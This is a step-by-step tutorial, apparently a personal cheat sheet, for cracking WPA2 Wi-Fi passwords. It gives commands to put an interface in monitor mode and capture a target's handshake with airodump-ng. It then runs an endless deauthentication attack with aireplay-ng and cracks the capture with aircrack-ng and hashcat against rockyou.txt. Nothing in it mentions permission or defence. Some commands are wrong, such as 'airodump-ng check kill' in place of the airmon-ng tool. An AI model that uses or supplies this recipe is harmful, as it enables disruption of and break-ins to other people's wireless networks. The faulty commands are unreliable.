###WPA2 Cracking with Airo Dump###

NEEDED:
-Airodump
-Aireplay
-Aircrack
-Hashcat 
-Rockyou.txt


#First discover your wireless interface:
    $ ifconfig
    *mine will be wlp2s0

#Check for processes that can cause trouble during the handshake
    $ airodump-ng check wlp2s0

#Kill the processes (choose one of the two methods)
   1 - $ kill [PID]
   2 - $ airodump-ng check kill wlp2s0

#Check if there are any processes by repeating:
    $ airodump-ng check wlp2s0

#Set wireless network to monitor mode
    $ ifconfig wlp2s0 down
    $ iwconfig wlp2s0 mode monitor
    $ ifconfig wlp2s0 up

#Check if it changed to Mon Mode
    $ iwconfig 

#Get handshake with Airo Dump
    $ airodump-ng wlp2s0
    CTRL-C
    $ airodump-ng -c [CH Number] --bssid [TargetMac] -w [FileName] wlp2s0

    --OPEN ANOTHER TERMINAL TO DEAUTH ATTACK--
    $aireplay-ng -0 0 -a [TargetMac] wlp2s0
    *Zero means to deauthenticate forever (until we close the program) 
    
    CTRL-C the aireplay-ng Terminal
    CTRL-C the airodump-ng Terminal
    *This will stop the attack and write the data to files in the Dir you've created.

>There will be 4 files
>Keep the .cap file, delete the others as you wish    
>Transfer the files wherever you want

>Open the .cap file with wireshark or any .cap reader
    $ apt-get install wireshark (if not installed)
>Filter the "eapol" packages by typing it in the wireshark filter bar 
>This is for inspecting the packages inside the .cap file

###Now Crack The Password With Aircrack Bruteforce###
>Download rockyou.txt
>Put in the desired Dir
>Convert your .cap file into a .hccapx file in hashcat.net site.
>Go to the dir where you put the .cap file 
    $aircrack-ng -w [rockyou.txt dir] [filename.cap]
>This would take a long time. So lets use Hashcat!

>Go to the converted .hccapx dir
    $ hashcat -a 0 -m 2500 [filename.hccapx] [rockyou.txt DIR]
